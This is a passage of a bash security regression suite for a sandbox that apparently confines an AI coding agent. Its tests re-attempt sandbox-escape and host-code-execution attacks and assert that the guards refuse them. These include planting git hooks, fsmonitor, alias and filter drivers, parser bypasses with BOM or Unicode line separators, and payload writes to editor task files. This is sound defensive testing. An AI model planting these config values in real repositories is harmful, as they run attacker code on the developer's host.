#!/usr/bin/env bash
# One regression suite for every control the security audit established.
#
# Run it INSIDE a kib sandbox. Each check re-attempts a real attack and asserts the guard still
# refuses it, or re-attempts a legitimate operation and asserts the guard still permits it — a
# control that blocks the attack by breaking the workflow has also failed, so the regression
# half is not optional.
#
#   ./tests/security-test.sh              # everything
#   ./tests/security-test.sh --list       # what it covers, run nothing
#   ./tests/security-test.sh -k git       # only sections matching "git"
#   ./tests/security-test.sh --no-clipboard   # skip the clipboard probe (it alerts the desktop)
#
# NON-DESTRUCTIVE by construction: an exploit is proven dead by showing the write refused and
# the value resolving to nothing — never by running a payload or reading a real secret.
# Fixtures live in tests/.state/sectest and are reused between runs.
#
# ONE file on purpose: it runs inside the sandbox with nothing installed. Only its harness is
# shared (tests/lib.sh, beside it in the same checkout), so both suites report identically.
set -uo pipefail

KIB_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ARTIFACTS="$KIB_ROOT/tests/.state/sectest"
DO_CLIPBOARD=1
LIST_ONLY=0
KIB_TEST_FILTER=""

while [ $# -gt 0 ]; do
    case "$1" in
        --list) LIST_ONLY=1 ;;
        -k)
            shift
            KIB_TEST_FILTER="${1:-}"
            ;;
        --no-clipboard) DO_CLIPBOARD=0 ;;
        -h | --help)
            sed -n '2,18p' "$0" | sed 's/^# \{0,1\}//'
            exit 0
            ;;
        *)
            echo "unknown option: $1" >&2
            exit 2
            ;;
    esac
    shift
done

if [ "$LIST_ONLY" = 1 ]; then
    grep -oP '^section "\K[^"]+' "$0"
    exit 0
fi

export KIB_TEST_FILTER
# shellcheck source=SCRIPTDIR/lib.sh
. "$KIB_ROOT/tests/lib.sh"

# An exploit is dead only if the value ALSO resolves to nothing — the write being refused is
# necessary but not sufficient (an include could still supply it).
resolves_to_nothing() { # resolves_to_nothing <description> <repo> <key>
    active || return 0
    local got
    got="$(git -C "$2" config --get "$3" 2>/dev/null)"
    if [ -z "$got" ]; then pass "$1"; else fail "$1" "$3 resolves to: $got"; fi
}

# ── preflight ────────────────────────────────────────────────────
if [ ! -f /.dockerenv ] && [ "${HOME:-}" != /home/hostuser ]; then
    echo "❌ security-test.sh must run INSIDE a kib sandbox — it probes container-side" >&2
    echo "   guards, and several checks would be meaningless (or messy) on the host." >&2
    exit 2
fi

printf '%skib security regression suite%s  %s%s%s\n' "$T_B" "$T_N" "$T_D" "$(date -u '+%Y-%m-%d %H:%MZ')" "$T_N"

# Fixtures are reused, never recreated: the guard correctly refuses `unlink` of a .git/config,
# so a suite that made fresh repos every run would leave a growing pile of undeletable dirs.
mkdir -p "$ARTIFACTS" 2>/dev/null
fixture() { # fixture <name> [git-init-args…] — echoes its path, creating it once
    local name="$1"
    shift
    local path="$ARTIFACTS/$name"
    # Ask git, not the filesystem. `[ -e "$path" ]` reused a HOLLOW directory as if it were a
    # repo: the guard refuses to unlink a .git/config, so a `rm -rf` of the fixture dir from
    # inside the box leaves the directories behind without their .git — and every check needing
    # that fixture then skipped itself, reporting coverage the suite was not providing.
    #
    # The git dir must be INSIDE $path. A bare `rev-parse --git-dir` walks UP, so an empty
    # fixture dir answers with THIS repo's .git and reads as perfectly healthy — which is the
    # same false pass one level along. ($ARTIFACTS/wt is not built here; it needs
    # --separate-git-dir, whose git dir is deliberately elsewhere.)
    local gd
    gd="$(git -C "$path" rev-parse --absolute-git-dir 2>/dev/null || true)"
    case "$gd" in
        "$path" | "$path"/*) ;;
        *)
            # shellcheck disable=SC1007  # GIT_TEMPLATE_DIR= is a deliberate empty per-command env
            GIT_TEMPLATE_DIR= git init -q "$@" "$path" 2>/dev/null
            ;;
    esac
    printf '%s' "$path"
}

# ═════════════════════════════════════════════════════════════════
section "Container boundary — escape classes (info-tier controls)"

is "all capabilities dropped (CapEff)" "0000000000000000" "$(awk '/^CapEff:/{print $2}' /proc/self/status)"
# Capless at CREATION, not merely at runtime: nothing in this container ever drops SYS_ADMIN,
# because `docker run` never granted it. That makes the bounding set a kernel-level statement
# about the container rather than a claim about what some shell remembered to do.
is "CAP_SYS_ADMIN was never granted (bounding set)" "0" "$((0x$(awk '/^CapBnd:/{print $2}' /proc/self/status) & 0x200000 ? 1 : 0))"
is "CAP_SETPCAP was never granted either" "0" "$((0x$(awk '/^CapBnd:/{print $2}' /proc/self/status) & 0x100 ? 1 : 0))"
is "no-new-privileges set" "1" "$(awk '/^NoNewPrivs:/{print $2}' /proc/self/status)"
is "seccomp in filter mode" "2" "$(awk '/^Seccomp:/{print $2}' /proc/self/status)"
_lsm_label="$(tr -d '\0' </proc/self/attr/current 2>/dev/null)"
if [ -z "$_lsm_label" ]; then
    # Docker Desktop's LinuxKit kernel ships no AppArmor, so the label is not achievable and
    # asserting one is a guaranteed failure that says nothing. Skipped rather than relaxed:
    # the caps, seccomp and no-new-privs assertions above carry the same weight and still run.
    skip "AppArmor label" "no AppArmor in this kernel (LinuxKit / Docker Desktop)"
else
    # docker-default, NOT unconfined. Its `deny mount,` is incompatible with mounting inside
    # this container — which is exactly why the FUSE server lives in the sidecar instead.
    case "$_lsm_label" in
        docker-*) pass "AppArmor confined by docker-default ($_lsm_label)" ;;
        *) fail "AppArmor label is '$_lsm_label', not a docker-* profile" ;;
    esac
fi
unset _lsm_label
is "/proc/sys mounted read-only" "ro" "$(awk '$5=="/proc/sys"{split($6,o,",");print o[1]}' /proc/self/mountinfo | head -1)"
is "/sys mounted read-only" "ro" "$(awk '$5=="/sys"{split($6,o,",");print o[1]}' /proc/self/mountinfo | head -1)"
is "no docker socket" "absent" "$([ -S /var/run/docker.sock ] && echo present || echo absent)"
is "no docker binary" "absent" "$(command -v docker >/dev/null && echo present || echo absent)"
deny "/proc/sys is not writable" bash -c 'echo 1 > /proc/sys/kernel/dmesg_restrict'

syscall_errno() { # syscall_errno <mount|unshare>
    python3 -c "
import ctypes, os, sys
l = ctypes.CDLL('libc.so.6', use_errno=True)
rc = l.mount(b'none', b'/mnt', b'tmpfs', 0, None) if sys.argv[1] == 'mount' else l.unshare(0x00020000)
print('SUCCEEDED' if rc == 0 else os.strerror(ctypes.get_errno()))" "$1"
}
is "mount(2) refused" "Operation not permitted" "$(syscall_errno mount)"
is "unshare(2) refused" "Operation not permitted" "$(syscall_errno unshare)"

# ═════════════════════════════════════════════════════════════════
section "FUSE redaction (served by the sidecar, propagated in)"

# The view is mounted in the SIDECAR's container and reaches this one by mount propagation.
# readlink -f is kept because the mount is recorded under the resolved path either way.
fuse_at_pwd() {
    local p
    p="$(readlink -f "$PWD")"
    awk -v p="$p" '$2==p && $3 ~ /^fuse/ {print "fuse"; exit}' /proc/self/mounts
}
is "redaction is a FUSE mount at the project root" "fuse" "$(fuse_at_pwd)"

# There is no second, unredacted path to the project here. The sidecar topology means the real
# tree is only ever mounted in the OTHER container, so nothing to fence off and nothing to
# traverse into — /kib should not exist at all.
is "no unredacted copy of the project in this container" "absent" \
    "$([ -e /kib ] && echo present || echo absent)"

# …and no FUSE server beside the agent to pivot into. Asserted STRUCTURALLY, on the device: a
# FUSE server cannot run without /dev/fuse, so its absence proves the property outright. A
# `pgrep -f kib.guest.fuse` cannot — it matches the command line of any process that merely
# mentions the string, this suite's own shell included, and reads as a leak that is not there.
is "no /dev/fuse, so no FUSE server can run in this container" "absent" \
    "$([ -e /dev/fuse ] && echo present || echo absent)"

# The server's syscalls run as ITS uid, not the caller's. default_permissions is what makes the
# kernel re-check owner and mode against the CALLER — without it nothing inside the project is
# permission-checked at all.
is "the view is mounted default_permissions (POSIX perms are enforced)" "yes" \
    "$(awk -v p="$(readlink -f "$PWD")" '$2==p && $4 ~ /(^|,)default_permissions(,|$)/ {
        print "yes"; exit }' /proc/self/mounts)"

# Proven live, not just by the mount flag: a mode on a file the agent owns must gate it. A
# chmod that silently failed leaves the file MORE permissive, so each deny still fails loudly.
_perm="$PWD/.kib-perm-probe.$$"
if printf 'probe\n' >"$_perm" 2>/dev/null; then
    chmod 000 "$_perm" 2>/dev/null
    deny "a chmod 000 file in the project is unreadable" cat "$_perm"
    chmod 400 "$_perm" 2>/dev/null
    # tee, not a `>>` redirect: it opens the file for append itself, so the refusal is the
    # command's exit status rather than a shell error `deny` cannot see. Content is unchanged.
    deny "a chmod 400 file refuses writes" tee -a "$_perm" </dev/null
    chmod 600 "$_perm" 2>/dev/null
    rm -f "$_perm"
else
    skip "POSIX modes are enforced inside the project" "could not create the probe file"
fi
unset _perm

# ═════════════════════════════════════════════════════════════════
section "Host-executed config guard — git (C1–C4, H1, H2)"

REPO="$(fixture repo)"
deny "C1  include.path indirection" git -C "$REPO" config include.path evil.inc
deny "C1b includeIf.gitdir path" git -C "$REPO" config 'includeIf.gitdir:/x/.path' evil.inc
deny "    core.hooksPath (direct)" git -C "$REPO" config core.hooksPath /tmp/evilhooks
deny "    core.fsmonitor (fires on git status)" git -C "$REPO" config core.fsmonitor /tmp/fsm.sh
deny "    core.sshCommand" git -C "$REPO" config core.sshCommand '/tmp/x.sh'
deny "    core.pager" git -C "$REPO" config core.pager '/tmp/x.sh'
deny "    alias.* shell escape" git -C "$REPO" config alias.pwn '!/tmp/x.sh'
deny "C4  filter.*.clean driver" git -C "$REPO" config filter.pwn.clean 'echo pwn'
deny "    submodule.*.update (added after the audit)" git -C "$REPO" config submodule.lib.update '!/tmp/x.sh'
deny "    interactive.diffFilter (added after the audit)" git -C "$REPO" config interactive.diffFilter '/tmp/x.sh'
deny "    gpg.ssh.defaultKeyCommand (added after the audit)" git -C "$REPO" config gpg.ssh.defaultKeyCommand '/tmp/x.sh'
resolves_to_nothing "C1/C4 none of it resolves" "$REPO" core.hooksPath
resolves_to_nothing "    core.fsmonitor resolves to nothing" "$REPO" core.fsmonitor

# C3: the write IS the rename — git never edits config in place, so the validator runs there.
# The inline form is the one a header-only parser misses.
# shellcheck disable=SC2317,SC2329  # invoked indirectly — `deny` runs it via "$@"
config_rename() { # config_rename <repo> <config body>
    local tmp="$1/.git/cfg.candidate"
    printf '%s\n' "$2" >"$tmp" 2>/dev/null || return 1
    mv -f "$tmp" "$1/.git/config" 2>/dev/null
    local rc=$?
    rm -f "$tmp" 2>/dev/null
    return "$rc"
}
deny "C3  inline [core]hooksPath = … (one-line form)" \
    config_rename "$REPO" '[core]hooksPath = /tmp/evilhooks'
deny "C3b multi-line [core] / hooksPath (regression)" \
    config_rename "$REPO" "$(printf '[core]\n\thooksPath = /tmp/evilhooks')"
deny "C1c a newly added [include] section" \
    config_rename "$REPO" "$(printf '[include]\n\tpath = evil.inc')"

# C5: a subsection name is double-quoted and may contain ], # or ; — none of which end the
# header or start a comment. git resolves `[filter "e]v"]clean = …` to a live driver; a parser
# that splits at the first ] (or strips at #/;) misses it and lets it into .git/config.
deny "C5  inline quoted-] subsection driver" \
    config_rename "$REPO" "$(printf '[core]\n\trepositoryformatversion = 0\n[filter "e]v"]clean = true')"
deny "C5b # inside a quoted subsection name" \
    config_rename "$REPO" "$(printf '[core]\n\trepositoryformatversion = 0\n[filter "a#b"]clean = true')"
resolves_to_nothing "C5  the quoted-] driver resolves to nothing" "$REPO" 'filter.e]v.clean'

# MAC-C2 / MAC-H1: git NORMALISES before it parses — it drops a leading UTF-8 BOM and ends a
# line at \n only. A parser using str.strip()/str.splitlines() does neither, so a BOM or a
# U+2028 inside a quoted subsection breaks the header for it and not for git.
deny "MAC-C2 leading BOM before [core]fsmonitor" \
    config_rename "$REPO" "$(printf '\xef\xbb\xbf[core]fsmonitor = /tmp/fsm.sh')"
deny "MAC-H1 U+2028 inside a quoted subsection name" \
    config_rename "$REPO" "$(printf '[core]\n\trepositoryformatversion = 0\n[filter "\xe2\x80\xa8x"]clean = true')"
deny "MAC-H1b NEL (U+0085) inside a quoted subsection name" \
    config_rename "$REPO" "$(printf '[core]\n\trepositoryformatversion = 0\n[filter "\xc2\x85x"]clean = true')"
resolves_to_nothing "MAC-C2 the BOM'd fsmonitor resolves to nothing" "$REPO" core.fsmonitor

deny "C2  hardlink aliases the protected inode" ln "$REPO/.git/config" "$ARTIFACTS/aliased-config"
deny "    write into .git/hooks" bash -c "mkdir -p '$REPO/.git/hooks'; echo x > '$REPO/.git/hooks/pre-commit'"

BARE="$(fixture bare.git --bare)"
deny "H1  bare repo (dir not named .git) config" git -C "$BARE" config core.hooksPath /tmp/evilhooks
deny "H1b hooks inside the bare repo" bash -c "echo x > '$BARE/hooks/pre-commit'"
resolves_to_nothing "H1  bare repo hooksPath resolves to nothing" "$BARE" core.hooksPath

if [ ! -e "$ARTIFACTS/wt" ]; then
    # shellcheck disable=SC1007  # deliberate empty per-command env
    GIT_TEMPLATE_DIR= git init -q --separate-git-dir="$ARTIFACTS/gd" "$ARTIFACTS/wt" 2>/dev/null
fi
deny "H2  gitfile redirect → separate gitdir" git -C "$ARTIFACTS/wt" config core.fsmonitor /tmp/fsm.sh
resolves_to_nothing "H2  redirected fsmonitor resolves to nothing" "$ARTIFACTS/wt" core.fsmonitor

# A submodule's real config lives at .git/modules/<name>/config and its worktree carries only a
# gitfile. This is the coverage a `.git/hooks:ro` bind never had — it can only mask paths that
# exist at launch, and these three (submodule, nested repo, repo created mid-session) do not.
# The whole suite runs against repos this script git-inits, so "created mid-session" is implicit
# in every case above; these two add the shapes.
# H3 — a submodule. Its worktree carries only a gitfile; the real config lives at
# .git/modules/<name>/config. Built with --separate-git-dir, NOT `git submodule add`, because
# that CANNOT run in the box: it clones, a clone creates .git/hooks/ from the template, and the
# guard refuses that write. (Same for a plain `git clone` — worth knowing, and working as
# designed: creating a hooks dir is creating something the host would execute.) The layout
# --separate-git-dir produces is the one a real submodule has, which is what the guard sees.
SUBHOST="$(fixture subhost)"
if [ ! -e "$SUBHOST/lib/.git" ]; then
    mkdir -p "$SUBHOST/.git/modules" 2>/dev/null
    # shellcheck disable=SC1007  # deliberate empty per-command env
    GIT_TEMPLATE_DIR= git init -q --separate-git-dir="$SUBHOST/.git/modules/lib" \
        "$SUBHOST/lib" 2>/dev/null
fi
if [ -e "$SUBHOST/lib/.git" ]; then
    deny "H3  submodule config (real file under .git/modules)" \
        git -C "$SUBHOST/lib" config core.hooksPath /tmp/evilhooks
    deny "H3b hooks inside the submodule's gitdir" \
        bash -c "mkdir -p '$SUBHOST/.git/modules/lib/hooks'; echo x > '$SUBHOST/.git/modules/lib/hooks/pre-commit'"
    resolves_to_nothing "H3  submodule hooksPath resolves to nothing" "$SUBHOST/lib" core.hooksPath
    # Proves the three denials above are the GUARD refusing, not git rejecting a broken fixture
    # — which is exactly how this section passed while testing nothing.
    allow "regression: a benign key in the submodule's config" \
        git -C "$SUBHOST/lib" config user.name 'Test User'
else
    skip "H3  submodule config" "could not build the submodule fixture"
fi

# A nested repo: an ordinary .git directory that is not the project root's, and that the launch
# never saw. Same guard, no bind could have covered it.
NESTED="$(fixture outer/inner)"
deny "H4  nested repo config" git -C "$NESTED" config core.pager /tmp/x.sh
deny "H4b hooks in the nested repo" bash -c "echo x > '$NESTED/.git/hooks/pre-commit'"
resolves_to_nothing "H4  nested repo pager resolves to nothing" "$NESTED" core.pager

# Regression half — the guard must not break ordinary git.
allow "regression: benign git config write" git -C "$REPO" config user.name 'Test User'
allow "regression: git config read" git -C "$REPO" config --get user.name
allow "regression: git status" git -C "$REPO" status --short
allow "regression: git remote add" bash -c "git -C '$REPO' remote remove o 2>/dev/null; git -C '$REPO' remote add o https://example.invalid/r.git"
allow "regression: ordinary hardlink" bash -c "echo x > '$ARTIFACTS/hl-src'; ln -f '$ARTIFACTS/hl-src' '$ARTIFACTS/hl-dst'"

# ═════════════════════════════════════════════════════════════════
section "Host-executed config guard — non-git paths"

for p in .vscode/tasks.json .devcontainer/devcontainer.json .envrc \
    .githooks/pre-commit .gitmodules .cursor/mcp.json \
    .zed/tasks.json .zed/debug.json .run/app.run.xml .mvn/jvm.config \
    .exrc .nvim.lua .ripgreprc .yarnrc.yml; do
    deny "write $p" bash -c "mkdir -p \"\$(dirname '$ARTIFACTS/$p')\" 2>/dev/null; echo x > '$ARTIFACTS/$p'"
done

# The guard is AMBIENT-trigger files ONLY — ones the host runs at the next commit, `cd` or
# editor-open. A rule on a file ordinary work edits would refuse an everyday write, and the policy
# text tells the session to stop; anything waiting on a deliberate `claude` launch is warned about
# host-side instead (audit_project_configs). Prompt text is not execution.
# .idea/ is here, not above, since 2026-07-30: the [protect] rule broke `pnpm install`, whose
# EPERM under .idea/ ends the session over an unrelated command. Residual risk (run configs,
# File Watchers) is stated in guest/policy/global.kibignore.
# .claude/hooks/ and .claude-plugin/ joined them 2026-08-01, and unlike .idea that is a
# correction: nothing under them loads until a pointer names it AND `claude` is launched, so a
# report reaches the user in time — and refusing hooks/hooks.json blocked the one sanctioned way
# to ship a repo-local committed hook while the manifest that arms it stayed writable.
for p in .cursor/rules/style.md .claude/commands/deploy.md .claude/settings.json .mcp.json \
    mise.toml .idea/workspace.xml .claude/hooks/notify.sh sub/.claude/hooks/deep.sh \
    .claude-plugin/plugin.json .claude-plugin/marketplace.json; do
    allow "regression: $p stays writable (detected host-side, not refused)" \
        bash -c "mkdir -p \"\$(dirname '$ARTIFACTS/$p')\" 2>/dev/null; echo '{}' > '$ARTIFACTS/$p'"
done

# Protection covers DELETION too — a delete is half of a replace, and what is removed here is
# what a host `git checkout` puts straight back. Probed on a FIXTURE .git/config: if the guard
# ever regressed the only casualty is one the next run rebuilds. A NESTED guarded path whose
# root twin exists is deletable (see the mirror section below); an anchor never is.
deny "a guarded path cannot be DELETED, only read" rm -f "$REPO/.git/config"

# ═════════════════════════════════════════════════════════════════
section "Mirrors — reproduce, never author"

# A guarded path may be written at a NESTED location iff its bytes reproduce the same guarded
# tail at the project ROOT, which the box cannot write. That is what makes `git worktree add`
# work on a repo tracking .vscode/ without ever letting the box author a file the host executes.
# NOT keyed on the location or the file type: the box can `git commit`, so it decides what
# "tracked" means, and any carve-out resting on that is bypassable by committing the payload.
#
# The anchor has to be a real one the HOST wrote, so this uses kib's own tracked .vscode/ —
# every write below is nested under tests/.state/, which resolves to it.
ANCHOR="$KIB_ROOT/.vscode/settings.json"
WT="$ARTIFACTS/mirror/wt"
if [ ! -f "$ANCHOR" ]; then
    skip "mirror semantics" "this checkout has no .vscode/settings.json to anchor against"
else
    rm -rf "$WT" 2>/dev/null
    allow "a nested guarded dir may be created when the root one exists" mkdir -p "$WT/.vscode"
    allow "a nested guarded file may reproduce the root copy" \
        cp "$ANCHOR" "$WT/.vscode/settings.json"
    allow "…and what landed is byte-identical" cmp -s "$ANCHOR" "$WT/.vscode/settings.json"
    deny "one appended byte is refused" bash -c "printf x >> '$WT/.vscode/settings.json'"
    deny "a nested guarded file with NO root copy (the folderOpen payload)" \
        bash -c "echo '{}' > '$WT/.vscode/tasks.json'"
    deny "a payload cannot be RENAMED onto a guarded name" \
        bash -c "echo evil > '$WT/spare'; mv '$WT/spare' '$WT/.vscode/settings.json'"
    deny "a symlink cannot occupy a guarded name" \
        ln -sfn /etc/passwd "$WT/.vscode/settings.json"
    deny "a hardlink cannot alias a payload onto one" \
        bash -c "echo evil > '$WT/spare2'; ln -f '$WT/spare2' '$WT/.vscode/settings.json'"
    deny "a mirror cannot be TRUNCATED to a shorter script" \
        bash -c ": > '$WT/.vscode/settings.json'"
    # Deleting a mirror is deliberate: git worktree remove needs it, and the only thing that
    # can come back is the anchor's own bytes. Re-made first, because the probe above is
    # refused by unlinking what it produced — and SKIPPED if there is no mirror to delete,
    # since `rm -f` of a missing file succeeds and would report a pass for nothing.
    cp "$ANCHOR" "$WT/.vscode/settings.json" 2>/dev/null || true
    if [ -f "$WT/.vscode/settings.json" ]; then
        allow "regression: a mirror can be deleted (git worktree remove)" \
            rm -f "$WT/.vscode/settings.json"
    else
        skip "a mirror can be deleted" "no mirror could be created to delete"
    fi
fi
deny "the ROOT copy stays immutable — a mirror never unlocks its anchor" \
    bash -c "printf x >> '$ANCHOR'"

# ═════════════════════════════════════════════════════════════════
section "Redaction — .env and .kibignore"

# Staging the probe is itself a write to a redacted path, so it is refused and the read
# checks below only run against a .env the HOST put there before launch — nothing inside the
# box can create one, which is the control working. The subshell is load-bearing: a failed
# redirection is reported by the shell performing it, so `2>/dev/null` on the command misses it.
(printf 'SECRET=redacted-probe-value\n' >"$ARTIFACTS/.env") 2>/dev/null || true
deny "write .env is refused" bash -c "echo x > '$ARTIFACTS/.env' 2>/dev/null"

# A redacted file reads as its KEY NAMES with every value replaced (kib.guest.fuse.render).
# Both halves matter: hiding the names is what used to send the agent to ask the user, who
# then pasted the secret into the transcript — the leak the redaction existed to prevent.
# Compare without printing: no real value may reach the terminal or a log.
_env_probe=""
for _c in "$ARTIFACTS/.env" "$KIB_ROOT/.env"; do
    [ -f "$_c" ] && _env_probe="$_c" && break
done
if [ -n "$_env_probe" ]; then
    if grep -q 'redacted-probe-value' "$_env_probe" 2>/dev/null; then
        fail ".env values are redacted" "a real value came through"
    else
        pass ".env values are redacted"
    fi
    if grep -qE '^[A-Za-z_][A-Za-z0-9_]*=<redacted>$|^# REDACTED BY' "$_env_probe" 2>/dev/null; then
        pass ".env reads as keyed names or the stub, never raw"
    else
        fail ".env reads as keyed names or the stub, never raw" "neither shape matched"
    fi
else
    skip ".env values are redacted" "no host-staged .env to read (the box cannot create one)"
    skip ".env reads as keyed names or the stub, never raw" "no host-staged .env to read"
fi
allow "regression: .env.example is not redacted" \
    bash -c "echo 'KEY=placeholder' > '$ARTIFACTS/.env.example'"
# An exemption on the target alone is readable but not EDITABLE: no atomic writer touches the
# target, so the refusal landed on a path the caller never named. Both write siblings, and the
# rename that finishes the job, are the carve-out's real shape.
allow "regression: a placeholder's temp+rename write sibling is not redacted" \
    bash -c "t='$ARTIFACTS/.env.example.tmp.\$\$.e4cc80fbd4d5'
             echo 'KEY=placeholder' >\"\$t\" && mv \"\$t\" '$ARTIFACTS/.env.example'"
allow "regression: a placeholder's editor backup sibling is not redacted" \
    bash -c "echo 'KEY=placeholder' > '$ARTIFACTS/.env.example~'"
deny "the write-sibling shape does not carve out .env itself" \
    bash -c "echo 'X=1' > '$ARTIFACTS/.env.tmp.\$\$.e4cc80fbd4d5'"
deny "the write-sibling shape does not carve out .env.local" \
    bash -c "echo 'X=1' > '$ARTIFACTS/.env.local~'"

# ═════════════════════════════════════════════════════════════════
section "Shared config surface — cross-project pivot (H5, H6)"

SHARED="$HOME/.claude-shared"
# ONE open tier (host/config.sh). All five are writable and shared on purpose, so an install or
# an authored skill lands in canonical exactly as it would on the host. Asserted, because a
# regression that re-locks any of them breaks authoring and installing silently — and because the
# accepted cost of opening them (H6 cross-project auto-execution) should be visible in the suite
# that measures the sandbox, not only in the design note. The control is detection at teardown:
# kib/host/asset_scan.py, gated on a native `claude` actually being installed.
for d in skills agents commands plugins hooks; do
    if [ -d "$SHARED/$d" ]; then
        allow "shared $d/ is writable (one open tier, reported not prevented)" \
            bash -c "touch '$SHARED/$d/.sectest-probe'"
        rm -f "$SHARED/$d/.sectest-probe" 2>/dev/null
    else
        skip "shared $d/ is writable (one open tier, reported not prevented)" "not present"
    fi
done
# The sandbox rules mount :ro at Claude's managed-policy path, not into the config dir: they
# load ahead of user memory, no claudeMdExcludes can drop them, and the session cannot edit
# them. A regression that moves them back into the config dir loses all three.
_pol=/etc/claude-code/CLAUDE.md
is "sandbox policy is mounted at the managed-policy path" "present" \
    "$(grep -q 'kib sandbox' "$_pol" 2>/dev/null && echo present || echo missing)"
deny "sandbox policy is read-only to the session" bash -c "echo probe >>'$_pol'"

# settings.json is deliberately still writable — locking it would break /config.
is "settings.json stays writable (/config must work)" "writable" \
    "$([ -w "$SHARED/settings.json" ] && echo writable || echo 'read-only ***')"
# Broker ON: the real token never enters the box and a SYNTHETIC placeholder shadows it. The
# invariant is the CONTENT, not the mode — the shared dir is deliberately rw (that is what makes
# Claude's atomic credential rename work, the EBUSY footgun that made this mount dir-backed), so
# Claude replaces the read-only shadow with its own copy seconds after start. Asserting the file
# stays read-only asserts something the design never promised, and it passed only while Claude
# happened not to rewrite it. What must hold either way: no real token, ever.
#
# Broker OFF: the real credential is copied in writable, so in-sandbox Claude can refresh it —
# there is no placeholder to assert about, which is why this half only checks the mode.
if [ -n "${ANTHROPIC_BASE_URL:-}" ]; then
    is ".credentials.json in the box is synthetic, whatever Claude rewrites it to" "synthetic" \
        "$(grep -q 'fake_value_' "$SHARED/.credentials.json" 2>/dev/null && echo synthetic \
            || echo 'REAL TOKEN ***')"
    # The shadow kib mounts is still read-only at its own path, which Claude cannot rename over:
    # a regression that made THIS writable would put the real credential's mount mode in doubt.
    _ph=""
    for _c in /run/kib/placeholder-cred-*; do
        [ -e "$_c" ] && _ph="$_c" && break # bash 3.2 has no nullglob: an unmatched glob is itself
    done
    if [ -n "$_ph" ]; then
        is "the placeholder kib mounts is read-only at its own path" "read-only" \
            "$([ -w "$_ph" ] && echo 'writable ***' || echo read-only)"
    else
        skip "the placeholder kib mounts is read-only at its own path" "no placeholder bind"
    fi
    unset _ph _c
else
    is ".credentials.json stays writable (in-sandbox OAuth refresh, broker off)" "writable" \
        "$([ ! -e "$SHARED/.credentials.json" ] || [ -w "$SHARED/.credentials.json" ] \
            && echo writable || echo 'read-only ***')"
fi

# Every tree is a SYMLINK at canonical now, never a per-project farm: what a box installs or
# authors must land in ~/.claude, shared with every project, not be trapped in this one. The farm
# existed only to make installs work under the :ro mount, and it brought a depth table, a prune
# walk and a 30s macOS cold start with it.
CFG="${CLAUDE_CONFIG_DIR:-$HOME/.claude-session}"
for d in skills agents commands plugins hooks; do
    is "$d/ is a symlink to the shared tree, not a per-project farm" "symlink" \
        "$([ -L "$CFG/$d" ] && echo symlink || echo 'real dir ***')"
done
allow "regression: create a skill in-session" bash -c "mkdir -p '$CFG/skills/.sectest' && echo x > '$CFG/skills/.sectest/SKILL.md'"
allow "regression: create an agent in-session" bash -c "echo x > '$CFG/agents/.sectest.md'"
allow "regression: /plugin install can write where it lands" \
    mkdir -p "$CFG/plugins/cache/.sectest/p/1.0.0" "$CFG/plugins/marketplaces/.sectest"
rm -rf "$CFG/skills/.sectest" "$CFG/agents/.sectest.md" \
    "$CFG/plugins/cache/.sectest" "$CFG/plugins/marketplaces/.sectest" 2>/dev/null

# ── Cross-project isolation: the assembled config is THIS project only ──────────
# canonical ~/.claude holds every project's transcripts, ↑ history and .claude.json entries.
# kib assembles each box from only this project's slice; a leak would surface another
# project's data here. Compared, NEVER printed (other project paths are PII).
#
# The key is the path Claude RESOLVES to in here. The sidecar binds the project at its own
# host path, so that resolved path IS canonical's key and config_scope translates nothing.
# `pwd -P` is the resolved path by definition — read it, never $HOST_PWD, which is a host
# spelling that would compare the wrong string if the two ever came apart again.
MINE="$(pwd -P)"

if command -v python3 >/dev/null 2>&1 && [ -f "$CFG/.claude.json" ]; then
    _proj="$(
        MINE="$MINE" python3 - "$CFG/.claude.json" <<'PY'
import json, os, sys
mine = os.environ["MINE"]
try:
    data = json.load(open(sys.argv[1]))
except Exception:
    print("unreadable"); sys.exit()
keys = list((data.get("projects") or {}).keys())
print("ok" if keys == [mine] else ("leak:%d" % len(keys) if mine in keys else "missing"))
PY
    )"
    is ".claude.json exposes only this project (no other project entries)" "ok" "$_proj"
else
    skip ".claude.json exposes only this project" "no python3 or no .claude.json"
fi

_slug="$(printf '%s' "$MINE" | sed 's/[^a-zA-Z0-9]/-/g')"
_others=0
if [ -d "$CFG/projects" ]; then
    for _d in "$CFG/projects"/*; do
        [ -e "$_d" ] || continue
        [ "$(basename "$_d")" = "$_slug" ] || _others=$((_others + 1))
    done
fi
is "projects/ holds only this project's transcripts (no cross-project dirs)" "0" "$_others"

if [ -f "$CFG/history.jsonl" ] && command -v python3 >/dev/null 2>&1; then
    _hbad="$(
        MINE="$MINE" python3 - "$CFG/history.jsonl" <<'PY'
import json, os, sys
mine = os.environ["MINE"]; bad = 0
for line in open(sys.argv[1], errors="replace"):
    line = line.strip()
    if not line:
        continue
    try:
        if json.loads(line).get("project") != mine:
            bad += 1
    except Exception:
        pass
print(bad)
PY
    )"
    is "history.jsonl holds only this project's ↑ lines (no cross-project prompts)" "0" "$_hbad"
else
    skip "history.jsonl holds only this project's lines" "no history file or python3"
fi

# The top-level canonical store (which holds every project's data) is not mounted at all —
# only this project's nested binds are — so a cross-project pivot has nothing to read.
#
# `$HOME/.claude` is NOT required to be absent, and testing that it is was the wrong proxy: the
# entrypoint links it to THIS project's session dir so a host-installed plugin's absolute
# `installPath` still resolves inside the box. What matters is where it lands. Resolving the
# link is also stricter than the old `$HOME/.claude/projects` probe — it catches a canonical
# mount immediately, rather than only once Claude has created a `projects/` under it.
# Fail CLOSED on an unresolvable path: an empty `readlink -f` on both sides would otherwise
# compare equal and pass the check vacuously.
_canon=absent
if [ -e "$HOME/.claude" ]; then
    _c_got="$(readlink -f "$HOME/.claude" 2>/dev/null || true)"
    _c_want="$(readlink -f "$CFG" 2>/dev/null || true)"
    if [ -z "$_c_got" ] || [ -z "$_c_want" ]; then
        _canon="present (unresolvable: '$_c_got' vs '$_c_want')"
    elif [ "$_c_got" != "$_c_want" ]; then
        _canon="present ($_c_got)"
    fi
    unset _c_got _c_want
fi
if [ -e "$SHARED/projects" ] || [ -e "$SHARED/history.jsonl" ]; then
    _canon="present (canonical's per-project stores are in the shared dir)"
fi
is "canonical ~/.claude is not mounted into the sandbox" "absent" "$_canon"
unset _canon

# ═════════════════════════════════════════════════════════════════
section "Shared settings validator (H5) — host-side, exercised here"

if [ -f "$KIB_ROOT/host/config.sh" ] && command -v python3 >/dev/null; then
    # Against a throwaway ~/.claude; the real canonical config is never touched.
    # shellcheck disable=SC2317,SC2329  # invoked indirectly — `deny` runs it via "$@"
    validator() { # validator <json> — 0 accepted, 1 refused
        local d rc
